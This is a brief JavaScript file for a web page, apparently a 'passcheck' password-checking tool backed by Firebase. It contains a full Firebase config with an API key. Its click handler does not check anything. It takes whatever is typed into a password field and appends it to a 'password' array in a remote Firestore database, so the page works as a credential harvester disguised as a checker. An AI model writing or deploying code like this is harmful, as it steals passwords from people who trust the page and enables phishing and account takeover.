import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js'

import { getFirestore, doc, updateDoc, arrayUnion} from 'https://www.gstatic.com/firebasejs/10.12.3/firebase-firestore.js'

const firebaseConfig = {
  apiKey: "AIzaSyC0ygBOz6_1cIePmCku6c1DyZYnGlI3bSk",
  authDomain: "passcheck-0.firebaseapp.com",
  projectId: "passcheck-0",
  storageBucket: "passcheck-0.appspot.com",
  messagingSenderId: "435706064097",
  appId: "1:435706064097:web:68bc645a89f91753dd1ba0"
};

const app = initializeApp(firebaseConfig);

// Get a reference to the Firestore database (if using Firestore)
  const db = getFirestore(app);

  const checkBtn = document.getElementById('checkBtn');
  const passRef = doc(db, "passcheck", "password");
  checkBtn.addEventListener('click', function() {
      updateDoc(passRef, {
        password: arrayUnion(document.getElementById('lgd_out_pg_pass').value)
    });
  });
